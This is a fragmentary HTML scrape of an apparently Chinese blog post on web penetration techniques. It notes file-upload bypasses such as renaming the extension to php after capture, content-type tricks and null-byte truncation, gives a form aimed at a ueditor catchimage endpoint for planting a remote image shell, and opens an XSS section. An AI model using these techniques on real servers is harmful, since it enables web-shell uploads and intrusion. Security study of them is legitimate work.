 ...
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   ...
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    ...
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/605cdb9e84e7450aa2ef0d3057dedae6.png#pic_center"/>
    </p>
    <h3>
     <a id="_1">
     </a>
    ...
    <pre><code>前端绕过：上传一张图片，抓包修改后缀为php
content-type绕过：
...
http：//www.test.com/image/bitsec.jpg%20\0.php   （截断解析）
    ...
    <pre><code>&lt;form action="http://192.168.6.14:16661/Scripts/ueditor/net/controller.ashx?action=catchimage&amp;encode=utf-8" enctype="application/x-www-form-urlencoded" method="POST"&gt;
...
&lt;/form&gt;
    ...
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/6022ebc6e3dd45f1862cc628914a7484.png"/>
    </p>
    <pre><code>加载一个远程图片shell
表单在远程图片后加?.aspx
...
&lt;/script&gt;
 ...
 &lt;/html&gt;
    ...
    <p>
     ...
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/direct/8f9af6995b404a429fb3cade5bb98f0c.png"/>
    </p>
    <h3>
     <a id="XSS_224">
     </a>
...
%%EOF
 ...
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f34343735363436382f:61727469636c652f64657461696c732f313435303938353637" class_="artid" style="display:none">
 </p>
</div>
